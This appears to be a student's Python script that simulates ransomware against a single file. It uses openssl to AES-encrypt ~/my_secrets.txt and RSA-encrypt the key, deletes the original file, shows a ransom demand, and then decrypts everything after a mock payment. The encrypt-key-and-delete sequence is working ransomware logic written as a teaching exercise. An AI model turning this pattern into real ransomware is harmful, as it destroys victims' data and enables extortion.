from datetime import datetime
import subprocess
import os

#Required function to print details
def authInfo():
	#Define variables
	author = "Ong Lee Heung, Dominique"
	current_date = datetime.now().strftime("%d/%m/%Y")
	
	#Displays output
	print(f"Author : {author}")
	print(f"Date : {current_date}")
	print()
	
if __name__ == "__main__":
	authInfo()
	
	#Define path to the target file in the root directory
	targetFile = os.path.expanduser("~/my_secrets.txt")

	#Generate 16-byte Symmetric Key
	print("[*] Generating symmetric key ...")
	subprocess.run("openssl rand -base64 16 > key.txt", shell = True)
	
	#Generate public/private key pair / RSA key pair for attacker
	print("[*] Generating attacker RSA key pair ...")
	
	#Generate private key
	subprocess.run("openssl genrsa -out private.pem 2048", shell = True, stderr = subprocess.DEVNULL)
	
	#Generate public key from private key
	subprocess.run("openssl rsa -in private.pem -outform PEM -pubout -out public.pem", shell = True, stderr = subprocess.DEVNULL)
	
	#Encrypt target file
	print("[*] Encrypting my_secrets.txt ...")
	subprocess.run(f"openssl enc -aes-128-cbc -pbkdf2 -salt -in {targetFile} -out data_cipher.txt -pass file:key.txt -a", shell = True)
	
	#Encrypt symmetric key
	print("[*] Encrypting symmetric key ...")
	subprocess.run("openssl pkeyutl -encrypt -pubin -inkey public.pem -in key.txt | base64 > key_cipher.txt", shell = True)
	
	#Delete original files
	print("[*] Deleting original files ...")
	os.remove("key.txt")
	os.remove(targetFile)
	
	#Ransomware attack and decryption simulation
	print("\n*** RANSOMWARE WARNING ***")
	print("Your file my_secrets.txt is encrypted. To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me.\n")
	print()
	input("Press <ENTER> to simulate paying the $10,000 ransom ...")
	print()
	print("\n[*] Payment received! Decrypting files ...")
	
	#Decrypt key_cipher.txt using private key to recover key.txt
	subprocess.run("base64 -d key_cipher.txt | openssl pkeyutl -decrypt -inkey private.pem > key.txt", shell = True)
	
	#Victim uses the recovered key.txt to decrypt data_cipher.txt back to my_secrets.txt
	subprocess.run(f"openssl enc -d -aes-128-cbc -pbkdf2 -salt -in data_cipher.txt -out {targetFile} -pass file:key.txt -a", shell = True)
	
	#Delete created files to not leave any trail
	os.remove("key.txt")
	os.remove("key_cipher.txt")
	os.remove("data_cipher.txt")
	os.remove("private.pem")
	os.remove("public.pem")
	print("[*] Decryption complete! my_secrets.txt has been restored.")
